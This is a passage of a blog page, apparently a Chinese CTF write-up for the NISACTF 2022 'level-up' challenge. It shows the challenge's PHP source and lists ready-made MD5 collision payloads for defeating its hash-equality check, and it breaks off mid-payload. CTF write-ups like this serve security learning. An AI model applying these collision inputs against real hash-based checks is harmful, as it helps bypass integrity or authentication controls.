@@ -1,0 +1,726 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="August Rosenberg">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="[NISACTF 2022]level-up0x00 记录一下我第一次遇到的较为综合的题目 使用的知识点  扫描目录 md5 碰撞 sha1加密  0x01 这个地方其实其实什么东西也没有有，但是我们需要利用这一关到达下面的关卡   找到第二关 0x02 12345678910111213141516171819202122&lt;?php&#x2F;&#x2F;here is level 2error_report">
+<meta property="og:type" content="article">
+<meta property="og:title" content="total">
+<meta property="og:url" content="https://tsy244.github.io/2024/01/23/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/WEB/total/index.html">
+<meta property="og:site_name" content="AU9U5T">
+<meta property="og:description" content="[NISACTF 2022]level-up0x00 记录一下我第一次遇到的较为综合的题目 使用的知识点  扫描目录 md5 碰撞 sha1加密  0x01 这个地方其实其实什么东西也没有有，但是我们需要利用这一关到达下面的关卡   找到第二关 0x02 12345678910111213141516171819202122&lt;?php&#x2F;&#x2F;here is level 2error_report">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/total/image-20240123151230019.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/total/image-20240123151342211.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/total/image-20240123151459324.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/total/image-20240123152944845.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/total/image-20240123153144642.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/total/image-20240123153835572.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/total/image-20240123154456727.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/total/image-20240123154802494.png">
+<meta property="article:published_time" content="2024-01-23T07:10:18.000Z">
+<meta property="article:modified_time" content="2024-01-23T07:48:18.962Z">
+<meta property="article:author" content="August Rosenberg">
+<meta property="article:tag" content="渗透">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/total/image-20240123151230019.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>total - AU9U5T</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"tsy244.github.io","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":90,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":"G-BL1W5LRRDJ","gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>AU9U5T&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="total"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        August Rosenberg
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-01-23 15:10" pubdate>
+          January 23, 2024 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          7.7k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          64 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">total</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="NISACTF-2022-level-up"><a href="#NISACTF-2022-level-up" class="headerlink" title="[NISACTF 2022]level-up"></a>[NISACTF 2022]level-up</h1><p>0x00 记录一下我第一次遇到的较为综合的题目</p>
+<p>使用的知识点</p>
+<ol>
+<li>扫描目录</li>
+<li>md5 碰撞</li>
+<li>sha1加密</li>
+</ol>
+<p>0x01</p>
+<p>这个地方其实其实什么东西也没有有，但是我们需要利用这一关到达下面的关卡</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/total/image-20240123151230019.png" srcset="/img/loading.gif" lazyload alt="image-20240123151230019"></p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/total/image-20240123151342211.png" srcset="/img/loading.gif" lazyload alt="image-20240123151342211"></p>
+<p>找到第二关</p>
+<p>0x02</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//here is level 2</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;str.php&quot;</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;array1&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;array2&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$a1</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;array1&#x27;</span>];<br>    <span class="hljs-variable">$a2</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;array2&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$a1</span> == <span class="hljs-variable">$a2</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;????&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$a1</span>) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$a2</span>))&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$level3</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;level 2 failed ...&quot;</span>);<br>    &#125;<br><br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/total/image-20240123151459324.png" srcset="/img/loading.gif" lazyload alt="image-20240123151459324"></p>
+<p>由于这里使用hackbar的话不太好就操作</p>
+<p>所以使用bp进行抓包</p>
+<p>这里是请类型；比较所以直接使用md5值的碰撞</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/CSDNiamcoming/article/details/108837347">总结ctf中 MD5 绕过的一些思路_ctf md5-CSDN博客</a></p>
+</blockquote>
+<p>常见的一些碰撞有：</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs llvm">a<span class="hljs-operator">=</span><span class="hljs-variable">%4</span>d<span class="hljs-variable">%c9</span><span class="hljs-variable">%68</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%0</span>e<span class="hljs-variable">%e3</span><span class="hljs-variable">%5</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span><span class="hljs-variable">%95</span><span class="hljs-variable">%72</span><span class="hljs-variable">%d4</span><span class="hljs-variable">%77</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%72</span><span class="hljs-variable">%15</span><span class="hljs-variable">%87</span><span class="hljs-variable">%d3</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%a7</span><span class="hljs-variable">%b2</span><span class="hljs-variable">%1</span>b<span class="hljs-variable">%dc</span><span class="hljs-variable">%56</span><span class="hljs-variable">%b7</span><span class="hljs-variable">%4</span>a<span class="hljs-variable">%3</span>d<span class="hljs-variable">%c0</span><span class="hljs-variable">%78</span><span class="hljs-variable">%3</span>e<span class="hljs-variable">%7</span>b<span class="hljs-variable">%95</span><span class="hljs-variable">%18</span><span class="hljs-variable">%af</span><span class="hljs-variable">%bf</span><span class="hljs-variable">%a2</span><span class="hljs-variable">%00</span><span class="hljs-variable">%a8</span><span class="hljs-variable">%28</span><span class="hljs-variable">%4</span>b<span class="hljs-variable">%f3</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%8</span>e<span class="hljs-variable">%4</span>b<span class="hljs-variable">%55</span><span class="hljs-variable">%b3</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%42</span><span class="hljs-variable">%75</span><span class="hljs-variable">%93</span><span class="hljs-variable">%d8</span><span class="hljs-variable">%49</span><span class="hljs-variable">%67</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%a0</span><span class="hljs-variable">%d1</span><span class="hljs-variable">%55</span><span class="hljs-variable">%5</span>d<span class="hljs-variable">%83</span><span class="hljs-variable">%60</span><span class="hljs-variable">%fb</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%07</span><span class="hljs-variable">%fe</span><span class="hljs-variable">%a2</span><br>&amp;b<span class="hljs-operator">=</span><span class="hljs-variable">%4</span>d<span class="hljs-variable">%c9</span><span class="hljs-variable">%68</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%0</span>e<span class="hljs-variable">%e3</span><span class="hljs-variable">%5</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span><span class="hljs-variable">%95</span><span class="hljs-variable">%72</span><span class="hljs-variable">%d4</span><span class="hljs-variable">%77</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%72</span><span class="hljs-variable">%15</span><span class="hljs-variable">%87</span><span class="hljs-variable">%d3</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%a7</span><span class="hljs-variable">%b2</span><span class="hljs-variable">%1</span>b<span class="hljs-variable">%dc</span><span class="hljs-variable">%56</span><span class="hljs-variable">%b7</span><span class="hljs-variable">%4</span>a<span class="hljs-variable">%3</span>d<span class="hljs-variable">%c0</span><span class="hljs-variable">%78</span><span class="hljs-variable">%3</span>e<span class="hljs-variable">%7</span>b<span class="hljs-variable">%95</span><span class="hljs-variable">%18</span><span class="hljs-variable">%af</span><span class="hljs-variable">%bf</span><span class="hljs-variable">%a2</span><span class="hljs-variable">%02</span><span class="hljs-variable">%a8</span><span class="hljs-variable">%28</span><span class="hljs-variable">%4</span>b<span class="hljs-variable">%f3</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%8</span>e<span class="hljs-variable">%4</span>b<span class="hljs-variable">%55</span><span class="hljs-variable">%b3</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%42</span><span class="hljs-variable">%75</span><span class="hljs-variable">%93</span><span class="hljs-variable">%d8</span><span class="hljs-variable">%49</span><span class="hljs-variable">%67</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%a0</span><span class="hljs-variable">%d1</span><span class="hljs-variable">%d5</span><span class="hljs-variable">%5</span>d<span class="hljs-variable">%83</span><span class="hljs-variable">%60</span><span class="hljs-variable">%fb</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%07</span><span class="hljs-variable">%fe</span><span class="hljs-variable">%a2</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight wren"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs wren">$<span class="hljs-title class_">Param</span>1<span class="hljs-operator">=</span><span class="hljs-string">&quot;\x4d\xc9<span class="hljs-char escape_">\x68</span>\xff\x0e\xe3\x5c<span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\x95</span><span class="hljs-char escape_">\x72</span>\xd4<span class="hljs-char escape_">\x77</span>\x7b<span class="hljs-char escape_">\x72</span><span class="hljs-char escape_">\x15</span><span class="hljs-char escape_">\x87</span>\xd3\x6f\xa7\xb2\x1b\xdc<span class="hljs-char escape_">\x56</span>\xb7\x4a\x3d\xc0<span class="hljs-char escape_">\x78</span>\x3e\x7b<span class="hljs-char escape_">\x95</span><span class="hljs-char escape_">\x18</span>\xaf\xbf\xa2<span class="hljs-char escape_">\x00</span>\xa8<span class="hljs-char escape_">\x28</span>\x4b\xf3\x6e\x8e\x4b<span class="hljs-char escape_">\x55</span>\xb3\x5f<span class="hljs-char escape_">\x42</span><span class="hljs-char escape_">\x75</span><span class="hljs-char escape_">\x93</span>\xd8<span class="hljs-char escape_">\x49</span><span class="hljs-char escape_">\x67</span>\x6d\xa0\xd1<span class="hljs-char escape_">\x55</span>\x5d<span class="hljs-char escape_">\x83</span><span class="hljs-char escape_">\x60</span>\xfb\x5f<span class="hljs-char escape_">\x07</span>\xfe\xa2&quot;</span>;<br>$<span class="hljs-title class_">Param</span>2<span class="hljs-operator">=</span><span class="hljs-string">&quot;\x4d\xc9<span class="hljs-char escape_">\x68</span>\xff\x0e\xe3\x5c<span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\x95</span><span class="hljs-char escape_">\x72</span>\xd4<span class="hljs-char escape_">\x77</span>\x7b<span class="hljs-char escape_">\x72</span><span class="hljs-char escape_">\x15</span><span class="hljs-char escape_">\x87</span>\xd3\x6f\xa7\xb2\x1b\xdc<span class="hljs-char escape_">\x56</span>\xb7\x4a\x3d\xc0<span class="hljs-char escape_">\x78</span>\x3e\x7b<span class="hljs-char escape_">\x95</span><span class="hljs-char escape_">\x18</span>\xaf\xbf\xa2<span class="hljs-char escape_">\x02</span>\xa8<span class="hljs-char escape_">\x28</span>\x4b\xf3\x6e\x8e\x4b<span class="hljs-char escape_">\x55</span>\xb3\x5f<span class="hljs-char escape_">\x42</span><span class="hljs-char escape_">\x75</span><span class="hljs-char escape_">\x93</span>\xd8<span class="hljs-char escape_">\x49</span><span class="hljs-char escape_">\x67</span>\x6d\xa0\xd1\xd5\x5d<span class="hljs-char escape_">\x83</span><span class="hljs-char escape_">\x60</span>\xfb\x5f<span class="hljs-char escape_">\x07</span>\xfe\xa2&quot;</span>;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight wren"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs wren">$<span class="hljs-variable">data1</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;\xd1<span class="hljs-char escape_">\x31</span>\xdd<span class="hljs-char escape_">\x02</span>\xc5\xe6\xee\xc4<span class="hljs-char escape_">\x69</span>\x3d\x9a<span class="hljs-char escape_">\x06</span><span class="hljs-char escape_">\x98</span>\xaf\xf9\x5c\x2f\xca\xb5<span class="hljs-char escape_">\x07</span><span class="hljs-char escape_">\x12</span><span class="hljs-char escape_">\x46</span>\x7e\xab<span class="hljs-char escape_">\x40</span><span class="hljs-char escape_">\x04</span><span class="hljs-char escape_">\x58</span>\x3e\xb8\xfb\x7f<span class="hljs-char escape_">\x89</span><span class="hljs-char escape_">\x55</span>\xad<span class="hljs-char escape_">\x34</span><span class="hljs-char escape_">\x06</span><span class="hljs-char escape_">\x09</span>\xf4\xb3<span class="hljs-char escape_">\x02</span><span class="hljs-char escape_">\x83</span>\xe4<span class="hljs-char escape_">\x88</span><span class="hljs-char escape_">\x83</span><span class="hljs-char escape_">\x25</span>\xf1<span class="hljs-char escape_">\x41</span>\x5a<span class="hljs-char escape_">\x08</span><span class="hljs-char escape_">\x51</span><span class="hljs-char escape_">\x25</span>\xe8\xf7\xcd\xc9\x9f\xd9\x1d\xbd<span class="hljs-char escape_">\x72</span><span class="hljs-char escape_">\x80</span><span class="hljs-char escape_">\x37</span>\x3c\x5b\xd8<span class="hljs-char escape_">\x82</span>\x3e<span class="hljs-char escape_">\x31</span><span class="hljs-char escape_">\x56</span><span class="hljs-char escape_">\x34</span>\x8f\x5b\xae\x6d\xac\xd4<span class="hljs-char escape_">\x36</span>\xc9<span class="hljs-char escape_">\x19</span>\xc6\xdd<span class="hljs-char escape_">\x53</span>\xe2<span class="hljs-char escape_">\x34</span><span class="hljs-char escape_">\x87</span>\xda<span class="hljs-char escape_">\x03</span>\xfd<span class="hljs-char escape_">\x02</span><span class="hljs-char escape_">\x39</span><span class="hljs-char escape_">\x63</span><span class="hljs-char escape_">\x06</span>\xd2<span class="hljs-char escape_">\x48</span>\xcd\xa0\xe9\x9f<span class="hljs-char escape_">\x33</span><span class="hljs-char escape_">\x42</span>\x0f<span class="hljs-char escape_">\x57</span>\x7e\xe8\xce<span class="hljs-char escape_">\x54</span>\xb6<span class="hljs-char escape_">\x70</span><span class="hljs-char escape_">\x80</span><span class="hljs-char escape_">\x28</span>\x0d\x1e\xc6<span class="hljs-char escape_">\x98</span><span class="hljs-char escape_">\x21</span>\xbc\xb6\xa8<span class="hljs-char escape_">\x83</span><span class="hljs-char escape_">\x93</span><span class="hljs-char escape_">\x96</span>\xf9<span class="hljs-char escape_">\x65</span>\xab\x6f\xf7\x2a<span class="hljs-char escape_">\x70</span>&quot;</span>;<br>$<span class="hljs-variable">data2</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;\xd1<span class="hljs-char escape_">\x31</span>\xdd<span class="hljs-char escape_">\x02</span>\xc5\xe6\xee\xc4<span class="hljs-char escape_">\x69</span>\x3d\x9a<span class="hljs-char escape_">\x06</span><span class="hljs-char escape_">\x98</span>\xaf\xf9\x5c\x2f\xca\xb5<span class="hljs-char escape_">\x87</span><span class="hljs-char escape_">\x12</span><span class="hljs-char escape_">\x46</span>\x7e\xab<span class="hljs-char escape_">\x40</span><span class="hljs-char escape_">\x04</span><span class="hljs-char escape_">\x58</span>\x3e\xb8\xfb\x7f<span class="hljs-char escape_">\x89</span><span class="hljs-char escape_">\x55</span>\xad<span class="hljs-char escape_">\x34</span><span class="hljs-char escape_">\x06</span><span class="hljs-char escape_">\x09</span>\xf4\xb3<span class="hljs-char escape_">\x02</span><span class="hljs-char escape_">\x83</span>\xe4<span class="hljs-char escape_">\x88</span><span class="hljs-char escape_">\x83</span><span class="hljs-char escape_">\x25</span><span class="hljs-char escape_">\x71</span><span class="hljs-char escape_">\x41</span>\x5a<span class="hljs-char escape_">\x08</span><span class="hljs-char escape_">\x51</span><span class="hljs-char escape_">\x25</span>\xe8\xf7\xcd\xc9\x9f\xd9\x1d\xbd\xf2<span class="hljs-char escape_">\x80</span><span class="hljs-char escape_">\x37</span>\x3c\x5b\xd8<span class="hljs-char escape_">\x82</span>\x3e<span class="hljs-char escape_">\x31</span><span class="hljs-char escape_">\x56</span><span class="hljs-char escape_">\x34</span>\x8f\x5b\xae\x6d\xac\xd4<span class="hljs-char escape_">\x36</span>\xc9<span class="hljs-char escape_">\x19</span>\xc6\xdd<span class="hljs-char escape_">\x53</span>\xe2\xb4<span class="hljs-char escape_">\x87</span>\xda<span class="hljs-char escape_">\x03</span>\xfd<span class="hljs-char escape_">\x02</span><span class="hljs-char escape_">\x39</span><span class="hljs-char escape_">\x63</span><span class="hljs-char escape_">\x06</span>\xd2<span class="hljs-char escape_">\x48</span>\xcd\xa0\xe9\x9f<span class="hljs-char escape_">\x33</span><span class="hljs-char escape_">\x42</span>\x0f<span class="hljs-char escape_">\x57</span>\x7e\xe8\xce<span class="hljs-char escape_">\x54</span>\xb6<span class="hljs-char escape_">\x70</span><span class="hljs-char escape_">\x80</span>\xa8\x0d\x1e\xc6<span class="hljs-char escape_">\x98</span><span class="hljs-char escape_">\x21</span>\xbc\xb6\xa8<span class="hljs-char escape_">\x83</span><span class="hljs-char escape_">\x93</span><span class="hljs-char escape_">\x96</span>\xf9<span class="hljs-char escape_">\x65</span>\x2b\x6f\xf7\x2a<span class="hljs-char escape_">\x70</span>&quot;</span>;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">array<span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-variable">%af</span><span class="hljs-variable">%13</span><span class="hljs-variable">%76</span><span class="hljs-variable">%70</span><span class="hljs-variable">%82</span><span class="hljs-variable">%a0</span><span class="hljs-variable">%a6</span><span class="hljs-variable">%58</span><span class="hljs-variable">%cb</span><span class="hljs-variable">%3</span>e<span class="hljs-variable">%23</span><span class="hljs-variable">%38</span><span class="hljs-variable">%c4</span><span class="hljs-variable">%c6</span><span class="hljs-variable">%db</span><span class="hljs-variable">%8</span>b<span class="hljs-variable">%60</span><span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%bb</span><span class="hljs-variable">%90</span><span class="hljs-variable">%68</span><span class="hljs-variable">%a0</span><span class="hljs-variable">%2</span>d<span class="hljs-variable">%e9</span><span class="hljs-variable">%47</span><span class="hljs-variable">%aa</span><span class="hljs-variable">%78</span><span class="hljs-variable">%49</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%0</span>a<span class="hljs-variable">%c0</span><span class="hljs-variable">%c0</span><span class="hljs-variable">%31</span><span class="hljs-variable">%d3</span><span class="hljs-variable">%fb</span><span class="hljs-variable">%cb</span><span class="hljs-variable">%82</span><span class="hljs-variable">%25</span><span class="hljs-variable">%92</span><span class="hljs-variable">%0</span>d<span class="hljs-variable">%cf</span><span class="hljs-variable">%61</span><span class="hljs-variable">%67</span><span class="hljs-variable">%64</span><span class="hljs-variable">%e8</span><span class="hljs-variable">%cd</span><span class="hljs-variable">%7</span>d<span class="hljs-variable">%47</span><span class="hljs-variable">%ba</span><span class="hljs-variable">%0</span>e<span class="hljs-variable">%5</span>d<span class="hljs-variable">%1</span>b<span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%1</span><span class="hljs-keyword">c</span><span class="hljs-variable">%5</span><span class="hljs-keyword">c</span><span class="hljs-variable">%cd</span><span class="hljs-variable">%07</span><span class="hljs-variable">%2</span>d<span class="hljs-variable">%f7</span><span class="hljs-variable">%a8</span><span class="hljs-variable">%2</span>d<span class="hljs-variable">%1</span>d<span class="hljs-variable">%bc</span><span class="hljs-variable">%5</span>e<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%06</span><span class="hljs-variable">%46</span><span class="hljs-variable">%3</span>a<span class="hljs-variable">%0</span>f<span class="hljs-variable">%2</span>d<span class="hljs-variable">%4</span>b<span class="hljs-variable">%e9</span><span class="hljs-variable">%20</span><span class="hljs-variable">%1</span>d<span class="hljs-variable">%29</span><span class="hljs-variable">%66</span><span class="hljs-variable">%a4</span><span class="hljs-variable">%e1</span><span class="hljs-variable">%8</span>b<span class="hljs-variable">%7</span>d<span class="hljs-variable">%0</span><span class="hljs-keyword">c</span><span class="hljs-variable">%f5</span><span class="hljs-variable">%ef</span><span 